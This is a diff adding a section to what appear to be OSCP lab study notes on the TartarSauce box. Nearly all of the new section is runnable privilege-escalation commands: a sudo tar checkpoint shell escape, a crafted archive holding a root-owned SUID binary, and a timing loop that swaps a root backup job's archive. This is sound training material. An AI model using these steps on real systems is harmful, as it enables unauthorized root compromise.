@@ -850,3 +850,49 @@ This page turns one repeatable part of an authorized assessment into a checklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- demonstrates the workflow described here
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- user cron filename injection and sudo-generated configuration parsing
 - [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- custom SUID source review and adjacent-string privilege escalation
+- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- `sudo tar` checkpoint execution, systemd timer inspection, and archive replacement with an architecture-matched SUID helper
+
+## TartarSauce: tar, systemd timer, and archive trust boundary
+
+Check the exact sudo rule first:
+
+```bash
+sudo -l
+sudo -u onuma /bin/tar -cf /dev/null /dev/null \
+  --checkpoint=1 --checkpoint-action=exec=/bin/bash
+```
+
+Enumerate systemd timers and inspect the invoked script:
+
+```bash
+systemctl list-timers --all
+systemctl cat backuperer.timer backuperer.service 2>/dev/null
+sed -n '1,240p' /usr/sbin/backuperer
+uname -m
+file /bin/bash
+```
+
+Build an architecture-matched helper and preserve root/SUID metadata in the archive:
+
+```bash
+gcc -m32 -Os -s /tmp/suid.c -o "$BoxDir/exploits/suid"
+file "$BoxDir/exploits/suid"
+mkdir -p /dev/shm/evil/var/www/html
+cp "$BoxDir/exploits/suid" /dev/shm/evil/var/www/html/roothelper
+tar --owner=0 --group=0 --mode=4755 -czf /dev/shm/evil.tar.gz \
+  -C /dev/shm/evil var/www/html/roothelper
+```
+
+Wait for a stable hidden archive before replacing it:
+
+```bash
+while true; do
+  Candidate=$(find /var/tmp -maxdepth 1 -type f -name '.[0-9a-f]*' -printf '%p\n' 2>/dev/null | head -n1)
+  [ -z "$Candidate" ] && sleep 1 && continue
+  A=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0); sleep 1
+  B=$(stat -c '%s' "$Candidate" 2>/dev/null || echo 0)
+  [ "$A" -gt 0 ] && [ "$A" = "$B" ] && cp /dev/shm/evil.tar.gz "$Candidate" && break
+done
+```
+
+**Gotcha:** an extracted x86_64 helper cannot execute on this i686 target. Check `file` before entering the timer race.
